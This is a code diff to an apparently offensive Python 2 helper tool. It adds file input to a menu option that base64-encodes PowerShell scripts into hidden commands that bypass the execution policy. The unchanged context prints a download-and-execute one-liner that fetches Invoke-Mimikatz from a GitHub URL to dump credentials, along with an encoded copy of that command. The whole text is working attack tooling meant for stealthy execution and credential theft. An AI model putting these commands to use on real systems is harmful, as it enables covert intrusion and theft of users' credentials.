@@ -195,9 +195,17 @@ while ans:
     elif ans == 6:
         p101()
     elif ans == 7:
-        code = raw_input("PowerShell Script to Encode:")
-        print code 
-        print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
+        how = raw_input("1 - File, 2 - One liner: ")
+        if how == "1":
+            name = raw_input("full file path and file: ")
+            with open(name,'r') as file_read:
+                data=file_read.read()
+            print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(data)
+        else:
+            code = raw_input("PowerShell Script to Encode:")
+            print code
+            print "[*]Powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc " + powershell_encode(code)
+ 
     elif ans == 8:
         print "[*]Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
         print "\n[*]Base64 encoded version download and execute:\nPowershell.exe -NoP -NonI -Exec Bypass -enc " + powershell_encode("IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz")
